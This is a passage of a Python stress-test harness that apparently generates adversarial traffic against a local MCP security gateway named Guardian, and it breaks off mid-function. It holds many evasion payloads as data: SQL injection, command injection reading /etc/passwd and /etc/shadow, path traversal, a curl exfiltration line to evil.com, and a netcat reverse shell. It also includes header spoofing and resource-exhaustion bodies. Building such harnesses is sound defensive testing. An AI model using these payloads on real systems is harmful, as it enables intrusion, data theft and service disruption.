#!/usr/bin/env python3
"""
Hard-mode stress harness for Guardian — advanced evasion and adversarial techniques.

Builds on megaharness.py with attacks designed to bypass pattern-based detection:
  - WAF bypass encoding (double-URL, Unicode homoglyphs, null bytes, case mixing)
  - Protocol-level abuse (malformed JSON-RPC, batch bombs, smuggling patterns)
  - Header manipulation (multiple CF-Connecting-IP, X-Forwarded-For injection)
  - Behavioral mimicry (legit handshake then pivot to attack)
  - Timing evasion (slow drip under rate limit, coordinated burst)
  - Resource exhaustion (oversized payloads, connection churn)
  - Advanced recon (tool enumeration, error harvesting, capability probing)
  - Polyglot injection payloads that blend SQL/cmd/traversal

Usage:
    python3 megaharness_hard.py generate
    python3 megaharness_hard.py run --all --token TOKEN --concurrency 3
    python3 megaharness_hard.py report
"""
from __future__ import annotations
import argparse, http.client, json, math, os, pathlib, random, secrets
import statistics as st, sys, time, urllib.parse
from collections import Counter, defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed

PLAN_FILE = pathlib.Path(__file__).parent / "megaharness_hard_plan.jsonl"
RESULTS_DIR = pathlib.Path(__file__).parent / "megaharness_hard_results"
HOST = "127.0.0.1"
PORT = 8790
CONCURRENCY = 3
BATCH_SIZE = 10_000


def rpc_body(method="tools/list", id_=1, params=None):
    m = {"jsonrpc": "2.0", "method": method}
    if id_ is not None:
        m["id"] = id_
    if params is not None:
        m["params"] = params
    return json.dumps(m)


def doc_ipv4(n):
    blocks = [(192, 0, 2), (198, 51, 100), (203, 0, 113)]
    b = blocks[n % 3]
    host = 1 + (n // 3) % 254
    return f"{b[0]}.{b[1]}.{b[2]}.{host}"


def doc_ipv6(n):
    return f"2001:db8:dead:beef::{n:x}"


MCP_CLIENT_UAS = [
    "claude-code/2.1.0", "python-httpx/0.28.1", "mcp-inspector/0.16",
    "node-mcp/1.0", "cursor/0.42", "windsurf/1.0",
]

BROWSER_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/127.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
]

# ============================================================================
# H1: WAF BYPASS INJECTION (100K)
# ============================================================================
def gen_waf_bypass(count=100_000):
    """Advanced injection payloads designed to evade pattern-based detection."""
    cases = []
    valid_token = "__VALID__"

    # SQL injection with comment obfuscation
    sqli_bypass = [
        "' O/**/R 1=1 --",
        "' UN/**/ION SEL/**/ECT * FR/**/OM users --",
        "' oR '1'='1",                         # case mixing
        "' OR\t1=1\t--",                        # tab instead of space
        "' OR\n1=1\n--",                        # newline instead of space
        "'\x00 OR 1=1 --",                      # null byte prefix
        "' OR 1%3D1 --",                        # URL-encoded =
        "'-0 UNION ALL SELECT NULL--",
        "' AND 1=convert(int,@@version)--",     # MSSQL-style
        "1' ORDER BY 1--+",
        "' HAVING 1=1 --",
        "' GROUP BY columnname HAVING 1=1 --",
        "admin' AND substring(password,1,1)='a",
        "' OR EXISTS(SELECT 1) --",
        "' WAITFOR DELAY '0:0:5'--",            # time-based blind
        "1; EXEC('xp_cmd'+'shell ''whoami''')--",  # concat evasion
        "' UNION SELECT CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110)--",  # char() evasion
        "1 aND 1=1",                            # mixed case AND
        "' || '1'='1",                          # Oracle concat
        "' OR 1=1 LIMIT 1 OFFSET 0 --",
    ]

    # Unicode homoglyph evasion (visually similar but different codepoints)
    sqli_unicode = [
        "' OR 1=1 --",                    # fullwidth O
        "' OR 1=1 --",                     # en quad space
        "' OR 1=1 --",           # all en-quad spaces
        "' ൎR 1=1 --",                     # Malayalam letter
        "'​OR​1=1--",                 # zero-width space
        "' OR 1=1 --",                     # non-breaking space
        "' ＯＲ 1=1 --",                # fullwidth OR
    ]

    # Double URL encoding
    sqli_double_enc = [
        "%2527%2520OR%25201%253D1%2520--",      # double encoded ' OR 1=1 --
        "%252f%252a%252a%252f",                 # double encoded /**/
        "' %254fR 1%253D1 --",                 # double encoded OR and =
    ]

    # Command injection bypasses
    cmdi_bypass = [
        ";cat${IFS}/etc/passwd",                # IFS instead of space
        ";cat$IFS/etc/passwd",
        "$(cat</etc/passwd)",                   # input redirection
        "`cat\t/etc/passwd`",                   # tab separator
        ";{cat,/etc/passwd}",                   # brace expansion
        "$(printf 'cat /etc/passwd')",          # printf evasion
        "$'\\x63\\x61\\x74\\x20/etc/passwd'",  # hex escape
        ";c''a''t /etc/passwd",                 # quote splitting
        ";c\\at /etc/passwd",                   # backslash splitting
        ";\\/bin\\/cat /etc/passwd",            # escaped slashes
        ";cat /etc/pass?d",                     # glob
        ";cat /etc/pass*",                      # wildcard
        "| bash<<<'cat /etc/passwd'",           # herestring
        ";echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|bash",  # base64
        "$(echo${IFS}id)",
        "; wh`echo oam`i",                     # backtick nesting
        "&&id||whoami",                         # chained operators
        ";rev<<<'dwssap/cte/ tac'|bash",       # reverse string
        "| python3 -c 'import os;os.system(\"id\")'",
        ";a]a]a;id",                            # garbage prefix
    ]

    # Path traversal bypasses
    traversal_bypass = [
        "..%2f..%2f..%2fetc%2fpasswd",         # URL-encoded /
        "..%252f..%252fetc%252fpasswd",         # double URL-encoded
        "..%c0%af..%c0%afetc/passwd",           # overlong UTF-8
        "..%c1%9c..%c1%9cetc/passwd",           # another overlong
        "%2e%2e/%2e%2e/etc/passwd",             # encoded dots
        "....//....//etc/passwd",               # double-dot bypass
        "..;/..;/etc/passwd",                   # semicolon bypass (Tomcat)
        "..\\..\\..\\/etc/passwd",              # mixed separators
        "..%00/etc/passwd",                     # null byte
        "/..\\..\\..\\etc\\passwd",             # backslash
        "....\\\\....\\\\etc\\\\passwd",        # double backslash
        "%252e%252e%252f%252e%252e%252f",       # double-encoded dots
        "/var/www/../../etc/passwd",            # absolute prefix
        "/.%00./etc/passwd",                    # null in dots
    ]

    # Polyglot payloads (trigger multiple detection categories at once)
    polyglots = [
        "'; cat /etc/passwd; echo '",           # SQL + cmd
        "' UNION SELECT load_file('/etc/passwd')--",  # SQL + traversal
        "$(cat ../../../etc/passwd) OR 1=1",    # cmd + traversal + SQL
        "; curl http://evil.com/?q=' OR 1=1--", # cmd + SQL
        "../../../usr/bin/sqlite3 x 'SELECT * FROM sqlite_master'",  # traversal + SQL
    ]

    all_payloads = (
        [(p, "sqli_bypass") for p in sqli_bypass] +
        [(p, "sqli_unicode") for p in sqli_unicode] +
        [(p, "sqli_double_enc") for p in sqli_double_enc] +
        [(p, "cmdi_bypass") for p in cmdi_bypass] +
        [(p, "traversal_bypass") for p in traversal_bypass] +
        [(p, "polyglot") for p in polyglots]
    )

    for i in range(count):
        payload, subcat = all_payloads[i % len(all_payloads)]
        ip = doc_ipv4(i % 500)
        body = rpc_body("tools/call", i, {"name": "shell_explain", "arguments": {"command": payload}})
        cases.append({"method": "POST", "path": "/mcp", "ip": ip,
                      "ua": MCP_CLIENT_UAS[i % len(MCP_CLIENT_UAS)],
                      "token": valid_token, "body": body,
                      "category": "H1_waf_bypass", "subcategory": subcat})
    return cases


# ============================================================================
# H2: PROTOCOL ABUSE (100K)
# ============================================================================
def gen_protocol_abuse(count=100_000):
    """Malformed JSON-RPC, batch bombs, content-type tricks, HTTP method abuse."""
    cases = []

    # Malformed JSON-RPC bodies
    malformed = [
        '{"jsonrpc":"2.0"}',                                    # missing method
        '{"jsonrpc":"1.0","method":"tools/list","id":1}',       # wrong version
        '{"method":"tools/list","id":1}',                       # missing jsonrpc
        '{"jsonrpc":"2.0","method":"tools/list","id":1,"extra":"field"}',  # extra field
        '{"jsonrpc":"2.0","method":"","id":1}',                 # empty method
        'not json at all',                                      # not JSON
        '',                                                     # empty body
        '{"jsonrpc":"2.0","method":"tools/list","id":null}',    # null id
        '{"jsonrpc":"2.0","method":"tools/list","id":-1}',      # negative id
        '{"jsonrpc":"2.0","method":"tools/list","id":"string"}',  # string id
        '[]',                                                   # empty batch
        'null',                                                 # null body
        '0',                                                    # number body
        '"string"',                                             # string body
        '{"jsonrpc":"2.0","method":"../../../etc/passwd","id":1}',  # traversal in method
        '{"jsonrpc":"2.0","method":"tools/list","id":1' + ',\n' * 100 + '}',  # trailing commas
    ]

    # JSON-RPC batch bombs
    batch_bombs = [
        json.dumps([{"jsonrpc": "2.0", "method": "tools/list", "id": i} for i in range(10)]),
        json.dumps([{"jsonrpc": "2.0", "method": "tools/list", "id": i} for i in range(50)]),
        json.dumps([{"jsonrpc": "2.0", "method": "tools/list", "id": i} for i in range(100)]),
        json.dumps([{"jsonrpc": "2.0", "method": "tools/call", "id": i,
                     "params": {"name": "devops_status", "arguments": {}}} for i in range(25)]),
    ]

    # Oversized payloads
    oversized = [
        rpc_body("tools/call", 1, {"name": "shell_explain", "arguments": {"command": "A" * 10000}}),
        rpc_body("tools/call", 1, {"name": "shell_explain", "arguments": {"command": "B" * 50000}}),
        rpc_body("tools/call", 1, {"name": "shell_explain", "arguments": {"command": "C" * 100000}}),
        '{"jsonrpc":"2.0","method":"tools/list","id":1,"padding":"' + "D" * 200000 + '"}',
    ]

    # HTTP method fuzzing
    methods = ["DELETE", "PUT", "PATCH", "OPTIONS", "HEAD", "TRACE", "CONNECT"]

    # Unauthorized method probing (try to call local_only tools)
    local_only_tools = [
        "blackwall_bruteforce", "blackwall_discover", "blackwall_exploit",
        "blackwall_portscan", "blackwall_vuln_scan", "blackwall_web_attack",
        "blackwall_web_enum", "blackwall_web_probe", "breach_check_email",
        "breach_check_password", "breach_scan_me", "guardian_block",
        "guardian_recent", "guardian_status", "guardian_unblock",
    ]

    for i in range(count):
        ip = doc_ipv4(i % 400)
        bucket = i % 10

        if bucket < 3:
            # Malformed JSON-RPC
            body = malformed[i % len(malformed)]
            cases.append({"method": "POST", "path": "/mcp", "ip": ip,
                          "ua": BROWSER_UAS[i % len(BROWSER_UAS)],
                          "token": None, "body": body,
                          "category": "H2_protocol_abuse", "subcategory": "malformed_rpc"})
        elif bucket < 5:
            # Batch bombs
            body = batch_bombs[i % len(batch_bombs)]
            cases.append({"method": "POST", "path": "/mcp", "ip": ip,
                          "ua": MCP_CLIENT_UAS[i % len(MCP_CLIENT_UAS)],
                          "token": "__VALID__", "body": body,
                          "category": "H2_protocol_abuse", "subcategory": "batch_bomb"})
        elif bucket < 6:
            # Oversized
            body = oversized[i % len(oversized)]
            cases.append({"method": "POST", "path": "/mcp", "ip": ip,
                          "ua": MCP_CLIENT_UAS[0], "token": "__VALID__", "body": body,
                          "category": "H2_protocol_abuse", "subcategory": "oversized"})
        elif bucket < 8:
            # HTTP method fuzzing
            m = methods[i % len(methods)]
            cases.append({"method": m, "path": "/mcp", "ip": ip,
                          "ua": BROWSER_UAS[0], "token": None, "body": None,
                          "category": "H2_protocol_abuse", "subcategory": "method_fuzz"})
        else:
            # Local-only tool access
            tool = local_only_tools[i % len(local_only_tools)]
            body = rpc_body("tools/call", i, {"name": tool, "arguments": {}})
            cases.append({"method": "POST", "path": "/mcp", "ip": ip,
                          "ua": MCP_CLIENT_UAS[i % len(MCP_CLIENT_UAS)],
                          "token": "__VALID__", "body": body,
                          "category": "H2_protocol_abuse", "subcategory": "local_only_access"})
    return cases


# ============================================================================
# H3: HEADER MANIPULATION (80K)
# ============================================================================
def gen_header_manipulation(count=80_000):
    """Attempt to spoof source IP via header injection, trust confusion."""
    cases = []

    for i in range(count):
        ip = doc_ipv4(i % 300)
        bucket = i % 8

        extra_headers = {}
        if bucket == 0:
            # X-Forwarded-For injection (should be ignored — Guardian trusts CF-Connecting-IP)
            extra_headers["X-Forwarded-For"] = "127.0.0.1"
            subcat = "xff_localhost"
        elif bucket == 1:
            extra_headers["X-Forwarded-For"] = "198.51.100.250, 10.0.0.1, 127.0.0.1"
            subcat = "xff_chain"
        elif bucket == 2:
            extra_headers["X-Real-IP"] = "127.0.0.1"
            subcat = "xrealip_localhost"
        elif bucket == 3:
            extra_headers["X-Forwarded-Host"] = "evil.com"
            subcat = "xfh_injection"
        elif bucket == 4:
            extra_headers["Host"] = "localhost"
            subcat = "host_localhost"
        elif bucket == 5:
            extra_headers["X-Original-URL"] = "/admin"
            subcat = "xorigurl"
        elif bucket == 6:
            # Try to override CF-Connecting-IP with a second value
            extra_headers["CF-Connecting-IP"] = "127.0.0.1"
            subcat = "cfip_override"
        else:
            # Huge header value
            extra_headers["X-Custom"] = "A" * 8000
            subcat = "large_header"

        cases.append({"method": "POST", "path": "/mcp", "ip": ip,
                      "ua": BROWSER_UAS[i % len(BROWSER_UAS)],
                      "token": f"__BAD_{secrets.token_hex(4)}__",
                      "body": rpc_body(),
                      "extra_headers": extra_headers,
                      "category": "H3_header_manipulation", "subcategory": subcat})
    return cases


# ============================================================================
# H4: BEHAVIORAL MIMICRY (100K)
# ============================================================================
def gen_behavioral_mimicry(count=100_000):
    """Start as a legit MCP client, then pivot to attack mid-session."""
    cases = []
    valid_token = "__VALID__"

    sessions = count // 20  # 20 requests per session

    for s in range(sessions):
        ip = doc_ipv4(s % 500)
        ua = MCP_CLIENT_UAS[s % len(MCP_CLIENT_UAS)]

        for r in range(20):
            if r < 5:
                # Phase 1: legitimate handshake and tool listing
                if r == 0:
                    body = rpc_body("initialize", s * 20 + r,
                                    {"protocolVersion": "2025-06-18", "capabilities": {},
                                     "clientInfo": {"name": "eval", "version": "1"}})
                elif r == 1:
                    body = rpc_body("notifications/initialized", None)
                else:
                    body = rpc_body("tools/list", s * 20 + r)
                subcat = "legit_phase"
            elif r < 10:
                # Phase 2: start probing (enumerate all tools)
                body = rpc_body("tools/call", s * 20 + r,
                                {"name": "devops_status", "arguments": {}})
                subcat = "enum_phase"
            elif r < 15:
                # Phase 3: try local_only tools
                tool = ["guardian_status", "breach_scan_me", "blackwall_portscan",
                        "guardian_unblock", "blackwall_discover"][r - 10]
                body = rpc_body("tools/call", s * 20 + r,
                                {"name": tool, "arguments": {}})
                subcat = "escalation_phase"
            else:
                # Phase 4: injection payloads
                payloads = [
                    "'; DROP TABLE users; --",
                    "; cat /etc/shadow",
                    "$(curl http://evil.com/exfil?d=$(cat /etc/passwd))",
                    "../../../etc/shadow",
                    "; nc -e /bin/bash 10.0.0.1 4444",
                ]
                body = rpc_body("tools/call", s * 20 + r,
                                {"name": "shell_explain",
                                 "arguments": {"command": payloads[r - 15]}})
                subcat = "attack_phase"

            cases.append({"method": "POST", "path": "/mcp", "ip": ip, "ua": ua,
                          "token": valid_token, "body": body,
                          "category": "H4_behavioral_mimicry", "subcategory": subcat})
    return cases[:count]


# ============================================================================
# H5: TIMING EVASION (80K)
# ============================================================================
def gen_timing_evasion(count=80_000):
    """Slow-drip attacks designed to stay under rate limits and authfail thresholds."""
    cases = []

    # H5a: Slow credential probe — exactly (threshold - 1) attempts per window
    slow_probe_count = count // 4
    for i in range(slow_probe_count):
        source = i // 7  # 7 attempts per source (under v2's threshold of 8)
        ip = doc_ipv4(source % 500)
        cases.append({"method": "POST", "path": "/mcp", "ip": ip,
                      "ua": BROWSER_UAS[i % len(BROWSER_UAS)],
                      "token": f"__BAD_{secrets.token_hex(4)}__",
                      "body": rpc_body(),
                      "delay_ms": 500,
                      "category": "H5_timing_evasion", "subcategory": "slow_probe_under_threshold"})

    # H5b: Rate limit evasion — send exactly at the limit
    rate_evasion_count = count // 4
    for i in range(rate_evasion_count):
        source = i // 119  # 119 per source (under 120 rate limit)
        ip = doc_ipv4(500 + (source % 200))
        cases.append({"method": "POST", "path": "/mcp", "ip": ip,
                      "ua": "curl/8.5.0", "token": None, "body": rpc_body(),
                      "delay_ms": 100,
                      "category": "H5_timing_evasion", "subcategory": "rate_limit_edge"})

    # H5c: Coordinated multi-source slow attack (N sources, each under threshold)
    coordinated_count = count // 4
    for i in range(coordinated_count):
        ip = doc_ipv4(i % 762)  # max unique IPs in doc range
        cases.append({"method": "POST", "path": "/mcp", "ip": ip,
                      "ua": BROWSER_UAS[0],
                      "token": f"__BAD_{secrets.token_hex(4)}__",
                      "body": rpc_body(),
                      "category": "H5_timing_evasion", "subcategory": "coordinated_distributed"})

    # H5d: Interleave legit + attack from same IP
    interleave_count = count - slow_probe_count - rate_evasion_count - coordinated_count
    valid_token = "__VALID__"
    for i in range(interleave_count):
        ip = doc_ipv4(i % 200)
        if i % 3 == 0:
            # Legit request
            cases.append({"method": "POST", "path": "/mcp", "ip": ip,
                          "ua": MCP_CLIENT_UAS[0], "token": valid_token,
                          "body": rpc_body("tools/list", i),
                          "category": "H5_timing_evasion", "subcategory": "interleaved_legit"})
        else:
            # Bad token
            cases.append({"method": "POST", "path": "/mcp", "ip": ip,
                          "ua": MCP_CLIENT_UAS[0],
                          "token": f"__BAD_{secrets.token_hex(4)}__",
                          "body": rpc_body(),
                          "category": "H5_timing_evasion", "subcategory": "interleaved_attack"})
    return cases


# ============================================================================
# H6: RESOURCE EXHAUSTION (60K)
# ============================================================================
def gen_resource_exhaustion(count=60_000):
    """Payloads designed to consume server memory, CPU, or connections."""
    cases = []

    # Deeply nested JSON
    def nested_json(depth):
        s = '{"a":' * depth + '1' + '}' * depth
        return s

    # JSON with many keys
    def wide_json(keys):
        return json.dumps({f"key_{i}": f"value_{i}" for i in range(keys)})

    for i in range(count):
        ip = doc_ipv4(i % 300)
        bucket = i % 6

        if bucket == 0:
            # Deep nesting
            body = '{"jsonrpc":"2.0","method":"tools/call","id":1,"params":' + nested_json(50 + (i % 200)) + '}'
            subcat = "deep_nesting"
        elif bucket == 1:
            # Wide JSON (many keys)
            body = '{"jsonrpc":"2.0","method":"tools/call","id":1,"params":' + wide_json(100 + (i % 500)) + '}'
            subcat = "wide_json"
        elif bucket == 2:
            # Repeated key attack
            body = '{"jsonrpc":"2.0","method":"tools/list",' + ','.join([f'"id":{j}' for j in range(100)]) + '}'
            subcat = "repeated_keys"
        elif bucket == 3:
            # Unicode stress
            body = rpc_body("tools/call", i, {"name": "shell_explain",
                            "arguments": {"command": "\U0001f4a9" * (1000 + i % 5000)}})
            subcat = "unicode_stress"
        elif bucket == 4:
            # Very long path
            path = "/" + "a" * (500 + i % 2000)
            cases.append({"method": "GET", "path": path, "ip": ip,
                          "ua": "curl/8.5.0", "token": None, "body": None,
                          "category": "H6_resource_exhaustion", "subcategory": "long_path"})
            continue
        else:
            # Rapid connection churn (new connection each request, no keep-alive)
            body = rpc_body()
            subcat = "connection_churn"

        cases.append({"method": "POST", "path": "/mcp", "ip": ip,
                      "ua": "curl/8.5.0", "token": None, "body": body,
                      "category": "H6_resource_exhaustion", "subcategory": subcat})
    return cases


# ============================================================================
# H7: ADVANCED RECON (80K)
# ============================================================================
def gen_advanced_recon(count=80_000):
    """Sophisticated reconnaissance — error harvesting, version probing, capability mapping."""
    cases = []

    # Version/tech probing paths
    recon_paths = [
        "/mcp", "/sse", "/health", "/healthz", "/status", "/version",
        "/.well-known/oauth-protected-resource",
        "/.well-known/oauth-authorization-server",
        "/.well-known/openid-configuration",
        "/.well-known/mcp.json",
        "/.well-known/ai-plugin.json",
        "/openapi.json", "/api-docs", "/swagger.json", "/swagger-ui/",
        "/graphql", "/graphiql",
        "/metrics", "/prometheus", "/debug/vars",
        "/_catalog", "/v2/_catalog",  # Docker registry
        "/info", "/env", "/configprops",  # Spring Actuator
    ]

    # Error message harvesting (send things that produce detailed errors)
    error_triggers = [
        rpc_body("nonexistent/method", 1),
        rpc_body("tools/call", 1, {"name": "nonexistent_tool", "arguments": {}}),
        rpc_body("tools/call", 1, {"name": "devops_status"}),  # missing arguments key
        rpc_body("tools/call", 1, {"name": "devops_status", "arguments": "not_a_dict"}),
        '{"jsonrpc":"2.0","method":"tools/call","id":1,"params":{"name":"shell_explain","arguments":{"command":1}}}',  # wrong arg type
        rpc_body("tools/call", 1, {"name": "", "arguments": {}}),  # empty tool name
        rpc_body("resources/list", 1),  # resource listing probe
        rpc_body("prompts/list", 1),  # prompt listing probe
        rpc_body("completion/complete", 1, {"ref": {"type": "ref/resource"}, "argument": {}}),
    ]

    # Tool catalog enumeration (rapid tools/list from many IPs)
    enum_body = rpc_body("tools/list", 1)

    for i in range(count):
        ip = doc_ipv4(i % 500)
        bucket = i % 5

        if bucket == 0:
            # Path probing for tech fingerprinting
            path = recon_paths[i % len(recon_paths)]
            cases.append({"method": "GET", "path": path, "ip": ip,
                          "ua": BROWSER_UAS[i % len(BROWSER_UAS)],
                          "token": None, "body": None,
                          "category": "H7_advanced_recon", "subcategory": "tech_probe"})
        elif bucket == 1:
            # Error harvesting
            body = error_triggers[i % len(error_triggers)]
            cases.append({"method": "POST", "path": "/mcp", "ip": ip,
                          "ua": MCP_CLIENT_UAS[i % len(MCP_CLIENT_UAS)],
                          "token": "__VALID__", "body": body,
                          "category": "H7_advanced_recon", "subcategory": "error_harvest"})
        elif bucket == 2:
            # Rapid tool enumeration from many sources
            cases.append({"method": "POST", "path": "/mcp", "ip": ip,
                          "ua": MCP_CLIENT_UAS[i % len(MCP_CLIENT_UAS)],
                          "token": "__VALID__", "body": enum_body,
                          "category": "H7_advanced_recon", "subcategory": "tool_enum"})
        elif bucket == 3:
            # Response timing probe (different paths, measure response time)
            paths = ["/mcp", "/healthz", "/robots.txt", "/", "/nonexistent"]
            path = paths[i % len(paths)]
            cases.append({"method": "GET", "path": path, "ip": ip,
                          "ua": "curl/8.5.0", "token": None, "body": None,
                          "category": "H7_advanced_recon", "subcategory": "timing_probe"})
        else:
            # Sequential tool calling (try every known tool name)
            tool_names = ["devops_status", "devops_health", "devops_logs",
                          "devops_containers", "devops_ask", "cortex_ask",
                          "cortex_remember", "cortex_memory_search",
                          "shell_explain", "shell_suggest", "shell_recall",
                          "devops_exposure", "devops_security_scan",
                          "devops_logins"]
            tool = tool_names[i % len(tool_names)]
            body = rpc_body("tools/call", i, {"name": tool, "arguments": {}})
            cases.append({"method": "POST", "path": "/mcp", "ip": ip,
                          "ua": MCP_CLIENT_UAS[0], "token": "__VALID__", "body": body,
                          "category": "H7_advanced_recon", "subcategory": "tool_cycling"})
    return cases


# ============================================================================
# H8: IPV6 ADVANCED ROTATION (50K)
# ============================================================================
def gen_ipv6_advanced(count=50_000):
    """IPv6 rotation across multiple /64 prefixes and encoding tricks."""
    cases = []

    prefixes_64 = [
        "2001:db8:dead:beef",
        "2001:db8:cafe:babe",
        "2001:db8:face:0000",
        "2001:db8:1234:5678",
        "2001:db8:abcd:ef01",
    ]

    for i in range(count):
        bucket = i % 5

        if bucket < 3:
            # Rotate across different /64s (should each be tracked separately)
            prefix = prefixes_64[i % len(prefixes_64)]
            ip = f"{prefix}::{i:x}"
            subcat = "multi_prefix_rotation"
        elif bucket == 3:
            # Same /64, sequential
            ip = f"2001:db8:dead:beef::{i:04x}"
            subcat = "sequential_64"
        else:
            # Expanded vs compressed notation (same address, different representation)
            n = i % 256
            ip = f"2001:0db8:0000:0000:0000:0000:0000:{n:04x}"
            subcat = "expanded_notation"

        cases.append({"method": "POST", "path": "/mcp", "ip": ip,
                      "ua": "python-requests/2.31.0",
                      "token": f"__BAD_{secrets.token_hex(4)}__",
                      "body": rpc_body(),
                      "category": "H8_ipv6_advanced", "subcategory": subcat})
    return cases


# ============================================================================
# H9: FALSE POSITIVE STRESS (100K)
# ============================================================================
def gen_fp_stress(count=100_000):
    """Benign inputs that look suspicious — the hardest FP test."""
    cases = []
    valid_token = "__VALID__"

    tricky_benign = [
        # SQL keywords in natural speech
        "Can you select all the containers that dropped connections?",
        "We need to union the two monitoring dashboards",
        "Please drop me a summary of the database performance",
        "Delete the old log rotation config and update it",
        "Insert a new cron job for the backup script",
        "Execute the health check and show me the table of results",
        "I want to alter the nginx configuration for the staging server",
        "Create a new user account for the DevOps team",
        "Grant read access to the monitoring database",
        "Truncate the log file — it's using too much disk",
        "The join between these two services is causing latency",
        "Where can I find the schema for the users table?",
        "Update the index on the search column",
        "What's the count of failed login attempts?",
        "Show me the distinct error codes from yesterday",

        # Command-injection-like phrases
        "Check if cat is installed on the server",
        "Run whoami to see which user the service runs as",
        "The curl command is timing out on the health endpoint",
        "We need to chmod 755 the deployment script",
        "Can you ls the /var/log directory?",
        "Use rm to clean up the tmp files older than 7 days",
        "The wget download failed — check the proxy settings",
        "How to pipe grep output to wc -l?",
        "Run echo $PATH to debug the missing binary",
        "Use nc to test if port 5432 is open",
        "The bash script has a syntax error on line 42",
        "Python subprocess.run(['id', '--help']) is failing",
        "Set up a ping monitor for the production servers",
        "The eval function in the config parser is deprecated",
        "How to use exec to replace the current process?",

        # Path-traversal-like phrases
        "Check the file at ../config/database.yml relative to app root",
        "The ../shared/lib directory has the common utilities",
        "Navigate to ../../docs to find the API specification",
        "The /etc/hosts file needs a new entry for the dev server",
        "Read /var/log/syslog for the kernel messages",
        "The .env file in the project root has the credentials",
        "Check .git/config for the remote URL",
        "The wp-admin dashboard is loading slowly",
        "Look at the /proc/meminfo for memory usage",
        "The .ssh/authorized_keys needs the deploy key added",

        # Mixed suspicious keywords in normal sentences
        "Select the best instance type then drop the underperforming ones",
        "We should exec into the container and cat the config file",
        "Union all three data feeds, then insert the aggregated results into the warehouse",
        "After you curl the endpoint, pipe the response to jq and grep for errors",
        "The OR condition in the query is causing a full table scan; try EXISTS instead",
    ]

    for i in range(count):
        phrase = tricky_benign[i % len(tricky_benign)]
        ip = doc_ipv4(i % 400)
        body = rpc_body("tools/call", i, {"name": "shell_explain",
                        "arguments": {"command": phrase}})
        cases.append({"method": "POST", "path": "/mcp", "ip": ip,
                      "ua": MCP_CLIENT_UAS[i % len(MCP_CLIENT_UAS)],
                      "token": valid_token, "body": body,
                      "category": "H9_fp_stress", "subcategory": "tricky_benign"})
    return cases


# ============================================================================
# H10: COMBINED CAMPAIGN (250K)
# ============================================================================
def gen_combined_campaign(count=250_000):
    """Realistic multi-phase attack campaign interleaved with legit traffic."""
    cases = []
    valid_token = "__VALID__"

    for i in range(count):
        roll = random.random()
        ip = doc_ipv4(i % 762)

        if roll < 0.20:
            # Legit MCP traffic (20%)
            body = rpc_body("tools/list" if random.random() > 0.5 else "tools/call",
                            i, {"name": "devops_status", "arguments": {}} if random.random() > 0.5 else None)
            cases.append({"method": "POST", "path": "/mcp", "ip": ip,
                          "ua": MCP_CLIENT_UAS[i % len(MCP_CLIENT_UAS)],
                          "token": valid_token, "body": body,
                          "category": "H10_campaign", "subcategory": "legit"})

        elif roll < 0.30:
            # Bot wave
            sigs = ["GPTBot/1.2", "ClaudeBot/1.0", "Bytespider", "AhrefsBot/7.0",
                    "SemrushBot/7~bl", "DataForSeoBot/1.0"]
            cases.append({"method": "GET", "path": "/", "ip": ip,
                          "ua": sigs[i % len(sigs)], "token": None, "body": None,
                          "category": "H10_campaign", "subcategory": "bot_wave"})

        elif roll < 0.45:
            # Distributed credential spray
            cases.append({"method": "POST", "path": "/mcp", "ip": ip,
                          "ua": BROWSER_UAS[i % len(BROWSER_UAS)],
                          "token": f"__BAD_{secrets.token_hex(4)}__",
                          "body": rpc_body(),
                          "category": "H10_campaign", "subcategory": "cred_spray"})

        elif roll < 0.55:
            # Path recon with evasion encoding
            paths = ["/.env", "/wp-login.php", "/admin",
                     "/%2e%2e/%2e%2e/etc/passwd", "/..%2f..%2f..%2fetc/passwd",
                     "/actuator/env", "/.git/HEAD"]
            cases.append({"method": "GET", "path": paths[i % len(paths)], "ip": ip,
                          "ua": BROWSER_UAS[0], "token": None, "body": None,
                          "category": "H10_campaign", "subcategory": "encoded_pathscan"})

        elif roll < 0.65:
            # WAF bypass injection
            payloads = [
                "' O/**/R 1=1 --", ";cat${IFS}/etc/passwd",
                "..%c0%af..%c0%afetc/passwd", "$(echo${IFS}id)",
                "' UN/**/ION SEL/**/ECT * --",
            ]
            body = rpc_body("tools/call", i, {"name": "shell_explain",
                            "arguments": {"command": payloads[i % len(payloads)]}})
            cases.append({"method": "POST", "path": "/mcp", "ip": ip,
                          "ua": MCP_CLIENT_UAS[0], "token": valid_token, "body": body,
                          "category": "H10_campaign", "subcategory": "waf_bypass"})

        elif roll < 0.75:
            # Protocol abuse
            malformed = ['not json', '', '[]', 'null',
                         '{"jsonrpc":"1.0","method":"x","id":1}']
            cases.append({"method": "POST", "path": "/mcp", "ip": ip,
                          "ua": "curl/8.5.0", "token": None,
                          "body": malformed[i % len(malformed)],
                          "category": "H10_campaign", "subcategory": "proto_abuse"})

        elif roll < 0.85:
            # IPv6 rotation
            ipv6 = f"2001:db8:cafe:babe::{i:x}"
            cases.append({"method": "POST", "path": "/mcp", "ip": ipv6,
                          "ua": "python-requests/2.31.0",
                          "token": f"__BAD_{secrets.token_hex(4)}__",
                          "body": rpc_body(),
                          "category": "H10_campaign", "subcategory": "ipv6_rotation"})

        else:
            # Flood burst
            cases.append({"method": "POST", "path": "/mcp", "ip": ip,
                          "ua": "Go-http-client/2.0", "token": None,
                          "body": rpc_body(),
                          "category": "H10_campaign", "subcategory": "flood"})

    return cases


# ============================================================================
# EXECUTION ENGINE (same as megaharness.py but handles extra_headers + delay)
# ============================================================================

def send_request(case, real_token):
    token = real_token if case.get("token") == "__VALID__" else case.get("token")
    headers = {"User-Agent": case["ua"], "Content-Type": "application/json"}
    if case.get("ip"):
        headers["CF-Connecting-IP"] = case["ip"]
    if token:
        headers["Authorization"] = f"Bearer {token}"
    for k, v in case.get("extra_headers", {}).items():
        if k != "CF-Connecting-IP":
            headers[k] = v

    body = case.get("body")
    data = body.encode("utf-8", errors="replace") if body else None

    delay = case.get("delay_ms", 0)
    if delay > 0:
        time.sleep(delay / 1000.0)

    try:
        conn = http.client.HTTPConnection(HOST, PORT, timeout=15)
        t0 = time.perf_counter()
